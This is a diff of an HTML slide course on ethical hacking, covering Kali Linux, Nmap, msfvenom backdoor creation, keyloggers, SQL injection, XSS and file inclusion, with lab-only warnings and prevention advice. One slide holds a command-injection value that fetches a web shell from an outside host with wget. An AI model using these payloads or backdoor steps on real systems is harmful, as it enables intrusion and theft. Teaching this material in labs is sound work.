       <div class="slide-body"><p>Every professional penetration test follows these stages:</p></div>
       <div class="steps">
@@ -304,7 +347,7 @@ function signOut() {
 
     <div class="slide">
       <div class="slide-num">04 / 04</div>
-      <div class="slide-tag">Day 1 · Key Terms</div>
+      <div class="slide-tag">Key Terms</div>
       <div class="slide-title">📚 Vocabulary to Know</div>
       <div class="terms-grid">
         <div class="term"><div class="term-word">Vulnerability</div><div class="term-def">A weakness in a system that can be exploited.</div></div>
@@ -325,7 +368,7 @@ function signOut() {
   <div class="lesson" id="day2">
 
     <div class="slide">
-      <div class="slide-tag">Day 2 · Lab Setup</div>
+      <div class="slide-tag">Lab Setup</div>
       <div class="slide-title">🖥️ Setting Up Your Virtual Lab</div>
       <div class="slide-body">
         <p>We'll use a <strong>Virtual Machine (VM)</strong> — a computer that runs inside your computer. This keeps our hacking tools isolated and safe. We will not be hacking on our main system.</p>
@@ -352,7 +395,7 @@ function signOut() {
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 2 · VMware</div>
+      <div class="slide-tag">VMware</div>
       <div class="slide-title">Step 1 — Download & Install VMware</div>
       <div class="slide-body"><p>VMware Workstation Player is free for personal use. Follow these steps:</p></div>
       <div class="steps">
@@ -373,7 +416,7 @@ function signOut() {
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 2 · Kali Linux</div>
+      <div class="slide-tag">Kali Linux</div>
       <div class="slide-title">Step 2 — Download Kali Linux</div>
       <div class="slide-body">
         <p><strong>Kali Linux</strong> is a special version of Linux built for cybersecurity professionals. It comes pre-installed with hundreds of hacking tools like Nmap, Metasploit, Wireshark and more.</p>
@@ -401,7 +444,7 @@ function signOut() {
     </div>
 
     <div class="lesson-nav">
-      <div class="nav-btn" onclick="showDay(1)">← Day 1</div>
+      <div class="nav-btn" onclick="showDay(1)">← Previous</div>
       <div class="nav-btn primary" onclick="showDay(3)">Next: Kali Basics →</div>
     </div>
   </div>
@@ -410,7 +453,7 @@ function signOut() {
   <div class="lesson" id="day3">
 
     <div class="slide">
-      <div class="slide-tag">Day 3 · Kali Linux</div>
+      <div class="slide-tag">Kali Linux</div>
       <div class="slide-title">🐉 Navigating Kali Linux</div>
       <div class="slide-body">
         <p>Kali Linux uses a <strong>command-line terminal</strong> as its main tool. Unlike Windows where you click icons, in Kali you type commands. This might feel strange at first — but within days it will feel natural.</p>
@@ -419,7 +462,7 @@ function signOut() {
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 3 · Terminal Basics</div>
+      <div class="slide-tag">Terminal Basics</div>
       <div class="slide-title">Essential Terminal Commands</div>
       <div class="slide-body"><p>These are the most important commands every hacker must know:</p></div>
       <div class="code-lang">bash — terminal</div>
@@ -454,7 +497,7 @@ sudo apt update && sudo apt upgrade</pre></div>
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 3 · Kali Tools</div>
+      <div class="slide-tag">Kali Tools</div>
       <div class="slide-title">🛠️ Key Tools in Kali Linux</div>
       <div class="slide-body"><p>Kali comes with 600+ tools. Here are the main ones we will use this week:</p></div>
       <div class="vis-grid">
@@ -492,7 +535,7 @@ sudo apt update && sudo apt upgrade</pre></div>
     </div>
 
     <div class="lesson-nav">
-      <div class="nav-btn" onclick="showDay(2)">← Day 2</div>
+      <div class="nav-btn" onclick="showDay(2)">← Previous</div>
       <div class="nav-btn primary" onclick="showDay(4)">Next: Nmap & Scanning →</div>
     </div>
   </div>
@@ -501,7 +544,7 @@ sudo apt update && sudo apt upgrade</pre></div>
   <div class="lesson" id="day4">
 
     <div class="slide">
-      <div class="slide-tag">Day 4 · Networking</div>
+      <div class="slide-tag">Networking</div>
       <div class="slide-title">🌐 How Networks Work</div>
       <div class="slide-body">
         <p>Before you can hack anything, you need to understand how computers talk to each other. A <strong>network</strong> is a group of devices connected together to share data.</p>
@@ -529,7 +572,7 @@ sudo apt update && sudo apt upgrade</pre></div>
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 4 · Nmap</div>
+      <div class="slide-tag">Nmap</div>
       <div class="slide-title">🗺️ Scanning with Nmap</div>
       <div class="slide-body">
         <p><strong>Nmap</strong> (Network Mapper) is the most famous tool for discovering what's on a network. It shows you which devices are online and what services they're running.</p>
@@ -560,7 +603,7 @@ nmap -A <span class="str">192.168.1.1</span></pre></div>
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 4 · Reconnaissance</div>
+      <div class="slide-tag">Reconnaissance</div>
       <div class="slide-title">🔍 Information Gathering</div>
       <div class="slide-body"><p>Reconnaissance is the first phase of hacking — collecting as much info as possible before attacking. Here are some beginner tools:</p></div>
       <div class="code-lang">terminal commands</div>
@@ -582,7 +625,7 @@ traceroute google.com</pre></div>
     </div>
 
     <div class="lesson-nav">
-      <div class="nav-btn" onclick="showDay(3)">← Day 3</div>
+      <div class="nav-btn" onclick="showDay(3)">← Previous</div>
       <div class="nav-btn primary" onclick="showDay(5)">Next: Backdoors & Payloads →</div>
     </div>
   </div>
@@ -592,7 +635,7 @@ traceroute google.com</pre></div>
 
     <!-- SLIDE 1: Client-Side Attacks -->
     <div class="slide">
-      <div class="slide-tag">Day 5 · Attack Types</div>
+      <div class="slide-tag">Attack Types</div>
       <div class="slide-title">🎭 What is a Client-Side Attack?</div>
       <div class="slide-body">
         <p>So far we've looked at scanning and recon. Now let's talk about <strong>how attackers actually get into a system</strong>. One of the most common methods is a <strong>client-side attack</strong>.</p>
@@ -628,7 +671,7 @@ traceroute google.com</pre></div>
 
     <!-- SLIDE 2: What is a Backdoor -->
     <div class="slide">
-      <div class="slide-tag">Day 5 · Backdoors</div>
+      <div class="slide-tag">Backdoors</div>
       <div class="slide-title">🚪 What is a Backdoor?</div>
       <div class="slide-body">
         <p>A <strong>backdoor</strong> is a hidden program secretly installed on a target computer that gives an attacker <strong>remote control</strong> of that machine over the internet or a network — without the victim knowing.</p>
@@ -664,7 +707,7 @@ traceroute google.com</pre></div>
 
     <!-- SLIDE 3: Payload explained -->
     <div class="slide">
-      <div class="slide-tag">Day 5 · Payloads</div>
+      <div class="slide-tag">Payloads</div>
       <div class="slide-title">💣 What is a Payload?</div>
       <div class="slide-body">
         <p>A <strong>payload</strong> is the core code inside a backdoor or exploit that carries out the actual attack. When a victim runs an infected file, the payload executes silently in the background and connects back to the attacker's machine.</p>
@@ -692,7 +735,7 @@ traceroute google.com</pre></div>
 
     <!-- SLIDE 4: msfvenom intro -->
     <div class="slide">
-      <div class="slide-tag">Day 5 · msfvenom</div>
+      <div class="slide-tag">msfvenom</div>
       <div class="slide-title">⚗️ What is msfvenom?</div>
       <div class="slide-body">
         <p><strong>msfvenom</strong> is a Kali Linux tool from the Metasploit Framework. It lets you <strong>create custom payloads</strong> — you choose the target OS, the type of connection, your IP address, a port, and the file format. msfvenom packages it all into a single file (e.g. a .exe) that you can use in a client-side attack.</p>
@@ -708,7 +751,7 @@ traceroute google.com</pre></div>
 
     <!-- SLIDE 5: List payloads -->
     <div class="slide">
-      <div class="slide-tag">Day 5 · msfvenom · Step 1</div>
+      <div class="slide-tag">msfvenom · Step 1</div>
       <div class="slide-title">📋 Step 1 — List Available Payloads</div>
       <div class="slide-body">
         <p>First, open your Kali terminal and list all available payloads so you can pick the right one for your target. There are hundreds of options for different operating systems and connection types.</p>
@@ -739,7 +782,7 @@ msfvenom --list payloads | grep meterpreter</pre></div>
 
     <!-- SLIDE 6: Find your IP -->
     <div class="slide">
-      <div class="slide-tag">Day 5 · msfvenom · Step 2</div>
+      <div class="slide-tag">msfvenom · Step 2</div>
       <div class="slide-title">🌐 Step 2 — Find Your Kali IP Address</div>
       <div class="slide-body">
         <p>Before creating the payload, you need to know your <strong>Kali machine's IP address</strong>. This is the <strong>LHOST</strong> (Local Host) — the address the victim's machine will call back to when the payload runs.</p>
@@ -766,7 +809,7 @@ ifconfig
 
     <!-- SLIDE 7: Create the payload -->
     <div class="slide">
-      <div class="slide-tag">Day 5 · msfvenom · Step 3</div>
+      <div class="slide-tag">msfvenom · Step 3</div>
       <div class="slide-title">⚗️ Step 3 — Create the Backdoor Payload</div>
       <div class="slide-body">
         <p>Now we create the payload using msfvenom. We package it as a <strong>.exe file</strong> — when a Windows victim runs this file, it connects back to our Kali machine and gives us full control.</p>
@@ -788,7 +831,7 @@ ifconfig
 
     <!-- SLIDE 8: Output result -->
     <div class="slide">
-      <div class="slide-tag">Day 5 · msfvenom · Step 4</div>
+      <div class="slide-tag">msfvenom · Step 4</div>
       <div class="slide-title">✅ Step 4 — Payload Created Successfully</div>
       <div class="slide-body">
         <p>After running the command, msfvenom will process and generate your backdoor file. Here's what the output looks like:</p>
@@ -816,7 +859,7 @@ ifconfig
 
     <!-- SLIDE 9: Video Demo -->
     <div class="slide">
-      <div class="slide-tag">Day 5 · Live Demo</div>
+      <div class="slide-tag">Live Demo</div>
       <div class="slide-title">🎬 Watch the Full Demo</div>
       <div class="slide-body">
         <p>Watch the full attack demonstration below — performed on the instructor's <strong>own virtual machine</strong> in a safe, isolated lab environment. This shows the complete process from creating the payload to gaining remote access.</p>
@@ -1080,12 +1123,12 @@ log_file = <span class="str">"key_log.txt"</span>
 cat key_log.txt
 
 <span class="cm"># Example output in key_log.txt:</span>
-<span class="cm"># 2026-04-07 14:32:01 - h</span>
-<span class="cm"># 2026-04-07 14:32:01 - e</span>
-<span class="cm"># 2026-04-07 14:32:02 - l</span>
-<span class="cm"># 2026-04-07 14:32:02 - l</span>
-<span class="cm"># 2026-04-07 14:32:02 - o</span>
-<span class="cm"># 2026-04-07 14:32:03 - [Key.space]</span></pre></div>
+<span class="cm"># YYYY-MM-DD HH:MM:SS - h</span>
+<span class="cm"># YYYY-MM-DD HH:MM:SS - e</span>
+<span class="cm"># YYYY-MM-DD HH:MM:SS - l</span>
+<span class="cm"># YYYY-MM-DD HH:MM:SS - l</span>
+<span class="cm"># YYYY-MM-DD HH:MM:SS - o</span>
+<span class="cm"># YYYY-MM-DD HH:MM:SS - [Key.space]</span></pre></div>
     </div>
 
     <div class="slide" style="border-color:rgba(251,191,36,0.2);">
@@ -1108,8 +1151,8 @@ cat key_log.txt
 
     <!-- SLIDE 10: Full week summary -->
     <div class="slide">
-      <div class="slide-tag">Day 5 · Week Wrap-Up</div>
-      <div class="slide-title">✅ Week 1 Complete — Full Summary</div>
+      <div class="slide-tag">Week Wrap-Up</div>
+      <div class="slide-title">✅ Module Complete — Full Summary</div>
       <div class="slide-body"><p>Here's everything you've covered this week:</p></div>
       <div class="steps">
         <div class="step"><div class="step-num">✓</div><div class="step-text">What ethical hacking is and the types of hackers (black/white/grey hat)</div></div>
@@ -1125,8 +1168,8 @@ cat key_log.txt
     </div>
 
     <div class="lesson-nav">
-      <div class="nav-btn" onclick="showDay(4)">← Day 4</div>
-      <a class="nav-btn primary" href="week2.html" style="text-decoration:none;display:flex;align-items:center;justify-content:center;">Week 2: Arduino & Pi →</a>
+      <div class="nav-btn" onclick="showDay(4)">← Previous</div>
+      <a class="nav-btn primary" href="week2.html" style="text-decoration:none;display:flex;align-items:center;justify-content:center;"> Arduino & Pi →</a>
     </div>
   </div>
 
@@ -1134,7 +1177,7 @@ cat key_log.txt
   <div class="lesson" id="day6">
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · How the Web Works</div>
+      <div class="slide-tag">How the Web Works</div>
       <div class="slide-title">🌐 How Websites Actually Work</div>
       <div class="slide-body">
         <p>Before you can hack a website, you need to understand how the web works at a deeper level. Every time you open a browser and visit a site, a complex chain of events happens in milliseconds — most people never see it.</p>
@@ -1164,7 +1207,7 @@ cat key_log.txt
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · Web Browsers</div>
+      <div class="slide-tag">Web Browsers</div>
       <div class="slide-title">🖥️ What is a Web Browser?</div>
       <div class="slide-body">
         <p>A <strong>web browser</strong> (Chrome, Firefox, Edge, Safari) is a program that sends requests to web servers and renders the responses. It's not just a window — it's a full application that interprets three languages:</p>
@@ -1183,7 +1226,7 @@ cat key_log.txt
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · Web Servers</div>
+      <div class="slide-tag">Web Servers</div>
       <div class="slide-title">🖥️ What is a Web Server?</div>
       <div class="slide-body">
         <p>A <strong>web server</strong> is software running on a computer that listens for incoming HTTP/HTTPS requests and responds with web pages, files or data. It's the engine behind every website. The computer running it is also called a server.</p>
@@ -1198,7 +1241,7 @@ cat key_log.txt
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · Databases</div>
+      <div class="slide-tag">Databases</div>
       <div class="slide-title">🗄️ Databases — Where All the Data Lives</div>
       <div class="slide-body">
         <p>Almost every website has a <strong>database</strong> behind it — storing users, passwords, products, posts, orders, messages. The web server queries the database using <strong>SQL (Structured Query Language)</strong> to get and store data.</p>
@@ -1219,7 +1262,7 @@ cat key_log.txt
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · HTTP Requests</div>
+      <div class="slide-tag">HTTP Requests</div>
       <div class="slide-title">📨 HTTP Requests & Responses — What's Really Sent</div>
       <div class="slide-body">
         <p>When your browser visits a page or submits a form, it sends an <strong>HTTP request</strong>. Understanding this is essential for web hacking because all attacks — SQL injection, XSS, CSRF — happen by manipulating these requests.</p>
@@ -1257,7 +1300,7 @@ Set-Cookie: session=xyz789; HttpOnly
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · SQL Injection</div>
+      <div class="slide-tag">SQL Injection</div>
       <div class="slide-title">💉 What is SQL Injection?</div>
       <div class="slide-body">
         <p><strong>SQL Injection (SQLi)</strong> is one of the oldest, most dangerous, and most common web vulnerabilities. It happens when a web application takes user input and inserts it directly into a SQL query <strong>without sanitising it</strong>. The attacker injects their own SQL code into the query, changing what it does.</p>
@@ -1276,7 +1319,7 @@ Set-Cookie: session=xyz789; HttpOnly
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · SQL Injection Explained</div>
+      <div class="slide-tag">SQL Injection Explained</div>
       <div class="slide-title">🔍 How SQL Injection Works — Step by Step</div>
       <div class="slide-body"><p>Let's walk through a real login bypass attack:</p></div>
       <div class="code-block"><pre><span class="cm">── NORMAL LOGIN ────────────────────────────────────────────────
@@ -1308,7 +1351,7 @@ Server builds this SQL query:</span>
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · SQL Injection Types</div>
+      <div class="slide-tag">SQL Injection Types</div>
       <div class="slide-title">🧬 Types of SQL Injection</div>
       <div class="terms-grid">
         <div class="term">
@@ -1335,7 +1378,7 @@ Server builds this SQL query:</span>
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · SQLi Payloads</div>
+      <div class="slide-tag">SQLi Payloads</div>
       <div class="slide-title">💉 Common SQL Injection Payloads</div>
       <div class="slide-body"><p>These are payloads used on intentionally vulnerable practice apps like <strong>DVWA</strong> and <strong>SQLi-Labs</strong>:</p></div>
       <div class="code-block"><pre><span class="cm">── BASIC TEST — check if field is vulnerable ──────────────────</span>
@@ -1365,7 +1408,7 @@ Server builds this SQL query:</span>
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · sqlmap</div>
+      <div class="slide-tag">sqlmap</div>
       <div class="slide-title">🤖 sqlmap — Automated SQLi Tool in Kali</div>
       <div class="slide-body">
         <p><strong>sqlmap</strong> is a powerful open-source tool in Kali Linux that automatically detects and exploits SQL injection vulnerabilities. It can dump entire databases, crack password hashes, and even get a shell on the server — all automated.</p>
@@ -1396,7 +1439,7 @@ sqlmap -u <span class="str">"http://target.com/login.php"</span> \
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · Prevention</div>
+      <div class="slide-tag">Prevention</div>
       <div class="slide-title">🛡️ How to Prevent SQL Injection</div>
       <div class="slide-body"><p>Understanding attacks makes you a better defender. Here's how developers prevent SQLi:</p></div>
       <div class="steps">
@@ -1416,7 +1459,7 @@ $stmt->execute([$_GET[<span class="str">'name'</span>]]);
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · Other Web Vulnerabilities</div>
+      <div class="slide-tag">Other Web Vulnerabilities</div>
       <div class="slide-title">🌐 Other Web Attacks to Know</div>
       <div class="terms-grid">
         <div class="term">
@@ -1443,7 +1486,7 @@ $stmt->execute([$_GET[<span class="str">'name'</span>]]);
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · Information Gathering</div>
+      <div class="slide-tag">Information Gathering</div>
       <div class="slide-title">🔍 Web Recon — Information Gathering</div>
       <div class="slide-body">
         <p>Before attacking a website, a professional penetration tester collects as much information as possible. This phase is called <strong>reconnaissance</strong>. The more you know about the target, the more attack vectors you can find.</p>
@@ -1456,7 +1499,7 @@ $stmt->execute([$_GET[<span class="str">'name'</span>]]);
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · Recon Tools</div>
+      <div class="slide-tag">Recon Tools</div>
       <div class="slide-title">🛠️ Information Gathering Tools</div>
       <div class="slide-body"><p>These are the tools a web penetration tester uses in the recon phase — all free, most already in Kali:</p></div>
       <div class="steps">
@@ -1483,7 +1526,7 @@ $stmt->execute([$_GET[<span class="str">'name'</span>]]);
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · Subdomains & Directories</div>
+      <div class="slide-tag">Subdomains & Directories</div>
       <div class="slide-title">📂 Finding Subdomains & Hidden Files</div>
       <div class="slide-body">
         <p><strong>Subdomains</strong> like <code style="color:#38bdf8;">beta.facebook.com</code> or <code style="color:#38bdf8;">admin.target.com</code> often run older, less secure software or have weaker configurations than the main site. Finding them expands your attack surface significantly.</p>
@@ -1518,7 +1561,7 @@ ip: 185.199.108.153
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · File Upload Vulnerabilities</div>
+      <div class="slide-tag">File Upload Vulnerabilities</div>
       <div class="slide-title">📁 File Upload Vulnerabilities</div>
       <div class="slide-body">
         <p>File upload vulnerabilities are among the simplest and most dangerous. They occur when a web application lets users upload files but <strong>doesn't properly validate what type of file is being uploaded</strong>. If an attacker can upload a PHP file, the server will execute it — giving them full control.</p>
@@ -1555,7 +1598,7 @@ help
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · Code Execution</div>
+      <div class="slide-tag">Code Execution</div>
       <div class="slide-title">⚙️ Code Execution Vulnerabilities</div>
       <div class="slide-body">
         <p>Code execution vulnerabilities allow an attacker to run <strong>operating system commands</strong> directly on the web server — as if they had a terminal. This is the most severe type of web vulnerability because it gives direct access to the server's OS, not just the web application.</p>
@@ -1586,7 +1629,7 @@ ip=8.8.8.8; wget http://your-server.com/shell.php -O /var/www/html/shell.php</pr
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · File Inclusion</div>
+      <div class="slide-tag">File Inclusion</div>
       <div class="slide-title">📂 LFI & RFI — File Inclusion Vulnerabilities</div>
       <div class="slide-body">
         <p><strong>Local File Inclusion (LFI)</strong> and <strong>Remote File Inclusion (RFI)</strong> occur when a web application includes files based on user input without proper validation. Think of it as the server being tricked into opening a file it shouldn't.</p>
@@ -1628,7 +1671,7 @@ allow_url_include = Off
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · XSS Deep Dive</div>
+      <div class="slide-tag">XSS Deep Dive</div>
       <div class="slide-title">🔀 XSS — Cross Site Scripting (Full Breakdown)</div>
       <div class="slide-body">
         <p>XSS allows an attacker to inject <strong>JavaScript code</strong> into a webpage that runs in other users' browsers — not on the server. The server is unaware. The attack targets the <strong>users</strong> of the website, not the website itself.</p>
@@ -1674,7 +1717,7 @@ allow_url_include = Off
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · Preventing XSS</div>
+      <div class="slide-tag">Preventing XSS</div>
       <div class="slide-title">🛡️ Preventing XSS — The Developer's Fix</div>
       <div class="slide-body">
         <p>XSS is prevented by <strong>encoding/escaping</strong> user input before inserting it into the HTML page. When special characters are escaped, the browser treats them as plain text — not executable code. The browser renders <code style="color:#38bdf8;">&amp;lt;script&amp;gt;</code> as visible text, not as a script tag.</p>
@@ -1709,7 +1752,7 @@ Content-Security-Policy: script-src <span class="str">'self'</span>
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · ZAP Scanner</div>
+      <div class="slide-tag">ZAP Scanner</div>
       <div class="slide-title">⚡ ZAP — Zed Attack Proxy</div>
       <div class="slide-body">
         <p><strong>OWASP ZAP (Zed Attack Proxy)</strong> is a free, beginner-friendly automated web vulnerability scanner built by OWASP and pre-installed in Kali Linux. It can automatically find SQLi, XSS, CSRF, file inclusion, and dozens of other vulnerabilities in a web application with a single scan.</p>
@@ -1739,7 +1782,7 @@ zaproxy
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · Mitigation Summary</div>
+      <div class="slide-tag">Mitigation Summary</div>
       <div class="slide-title">🛡️ Web Vulnerability Mitigation Summary</div>
       <div class="slide-body"><p>As a security professional you need to understand both attack AND defence. Here's how each vulnerability class is fixed:</p></div>
       <div class="steps">
@@ -1753,7 +1796,7 @@ zaproxy
     </div>
 
     <div class="slide">
-      <div class="slide-tag">Day 6 · Practice</div>
+      <div class="slide-tag">Practice</div>
       <div class="slide-title">🏋️ Practice on Legal Targets</div>
       <div class="slide-body"><p>Never practice on real websites. Use these intentionally vulnerable practice environments:</p></div>
       <a class="link-card" href="https://dvwa.co.uk" target="_blank">
@@ -1791,22 +1834,321 @@ zaproxy
 
 
     <div class="lesson-nav">
-      <div class="nav-btn" onclick="showDay(5)">← Day 5</div>
-      <a class="nav-btn primary" href="week2.html" style="text-decoration:none;display:flex;align-items:center;justify-content:center;">Week 2: Arduino →</a>
+      <div class="nav-btn" onclick="showDay(5)">← Previous</div>
+      <a class="nav-btn primary" href="week2.html" style="text-decoration:none;display:flex;align-items:center;justify-content:center;"> Arduino →</a>
     </div>
   </div>
 
-  <footer>TechCamp Boot Camp · Week 1 · Ethical Hacking Fundamentals</footer>
-</div>
+  <footer>TechCamp Boot Camp · Ethical Hacking</footer>
+
+</div><!-- end content-panel -->
+
+<!-- ── RIGHT: SIDEBAR ──────────────────────────────────── -->
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-hdr">
+    Course Content
+    <span>Ethical Hacking Fundamentals</span>
+  </div>
+
+  <!--  -->
+  <div class="curr-section">
+    <div class="curr-section-hdr active" onclick="toggleSection(this,1)">
+      <div class="curr-section-info">
+        <div class="curr-section-num"></div>
+        <div class="curr-section-title">Introduction to Ethical Hacking</div>
+        <div class="curr-section-meta">4 lessons · Hacker types · Laws · Career</div>
+      </div>
+      <div class="curr-chevron open" id="chev1">▾</div>
+    </div>
+    <div class="curr-lessons open" id="sec1">
+      <div class="curr-item active" onclick="showDay(1)">
+        <div class="curr-check active">▶</div>
+        <div class="curr-item-text"><div class="curr-item-title">What is Ethical Hacking?</div><div class="curr-item-dur">Black Hat vs White Hat vs Grey Hat</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(1)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Types of Hackers</div><div class="curr-item-dur">Skills, motivations, legal status</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(1)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Laws & Ethics</div><div class="curr-item-dur">Computer Fraud, written permission</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(1)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Penetration Testing Phases</div><div class="curr-item-dur">Recon → Scan → Exploit → Report</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!--  -->
+  <div class="curr-section">
+    <div class="curr-section-hdr" onclick="toggleSection(this,2)">
+      <div class="curr-section-info">
+        <div class="curr-section-num"></div>
+        <div class="curr-section-title">Setting Up Your Hacking Lab</div>
+        <div class="curr-section-meta">5 lessons · VMware · Kali Linux install</div>
+      </div>
+      <div class="curr-chevron" id="chev2">▾</div>
+    </div>
+    <div class="curr-lessons" id="sec2">
+      <div class="curr-item" onclick="showDay(2)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Virtual Machines Explained</div><div class="curr-item-dur">What a VM is and why we use one</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(2)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Installing VMware Workstation</div><div class="curr-item-dur">Download, install, first boot</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(2)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Installing Kali Linux</div><div class="curr-item-dur">ISO, VM setup, first login</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(2)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Kali Linux Tour</div><div class="curr-item-dur">Desktop, tools, package manager</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(2)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Snapshots & Network Modes</div><div class="curr-item-dur">NAT, Bridged, Host-Only explained</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!--  -->
+  <div class="curr-section">
+    <div class="curr-section-hdr" onclick="toggleSection(this,3)">
+      <div class="curr-section-info">
+        <div class="curr-section-num"></div>
+        <div class="curr-section-title">Linux Terminal & Networking</div>
+        <div class="curr-section-meta">5 lessons · Terminal · IP · Protocols</div>
+      </div>
+      <div class="curr-chevron" id="chev3">▾</div>
+    </div>
+    <div class="curr-lessons" id="sec3">
+      <div class="curr-item" onclick="showDay(3)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Linux Terminal Basics</div><div class="curr-item-dur">ls, cd, pwd, cat, mkdir, rm</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(3)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">File Permissions & Users</div><div class="curr-item-dur">chmod, chown, sudo, su</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(3)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Networking Fundamentals</div><div class="curr-item-dur">IP, MAC, DNS, subnets, ports</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(3)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">TCP/IP & Protocols</div><div class="curr-item-dur">TCP vs UDP, HTTP, HTTPS, FTP, SSH</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(3)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">ifconfig & netstat</div><div class="curr-item-dur">Reading your network config</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!--  -->
+  <div class="curr-section">
+    <div class="curr-section-hdr" onclick="toggleSection(this,4)">
+      <div class="curr-section-info">
+        <div class="curr-section-num"></div>
+        <div class="curr-section-title">Nmap & Reconnaissance</div>
+        <div class="curr-section-meta">5 lessons · Scanning · Fingerprinting</div>
+      </div>
+      <div class="curr-chevron" id="chev4">▾</div>
+    </div>
+    <div class="curr-lessons" id="sec4">
+      <div class="curr-item" onclick="showDay(4)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">What is Nmap?</div><div class="curr-item-dur">The world's most used port scanner</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(4)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Basic Nmap Scans</div><div class="curr-item-dur">-sS, -sV, -O, -A, -p flags</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(4)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Reading Nmap Results</div><div class="curr-item-dur">Open/closed/filtered, service versions</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(4)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">OSINT & Passive Recon</div><div class="curr-item-dur">Shodan, Google dorks, Whois</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(4)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Vulnerability Scanning</div><div class="curr-item-dur">Nmap scripts (NSE), service fingerprinting</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!--  -->
+  <div class="curr-section">
+    <div class="curr-section-hdr" onclick="toggleSection(this,5)">
+      <div class="curr-section-info">
+        <div class="curr-section-num"></div>
+        <div class="curr-section-title">Backdoors, Payloads & Exploitation</div>
+        <div class="curr-section-meta">6 lessons + Bonus Projects</div>
+      </div>
+      <div class="curr-chevron" id="chev5">▾</div>
+    </div>
+    <div class="curr-lessons" id="sec5">
+      <div class="curr-item" onclick="showDay(5)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Client-Side Attacks</div><div class="curr-item-dur">How attackers target users not servers</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(5)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">What is a Backdoor?</div><div class="curr-item-dur">Remote access tools explained</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(5)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">msfvenom Payloads</div><div class="curr-item-dur">Generating .exe and .apk backdoors</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(5)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">Metasploit — multi/handler</div><div class="curr-item-dur">Catching reverse shells</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(5)">
+        <div class="curr-check"></div>
+        <div class="curr-item-text"><div class="curr-item-title">🔍 Bonus: Python Port Scanner</div><div class="curr-item-dur">Build your own network scanner</div></div>
+      </div>
+      <div class="curr-item" onclick="showDay(5)">
+        <div class="curr-check"></div>
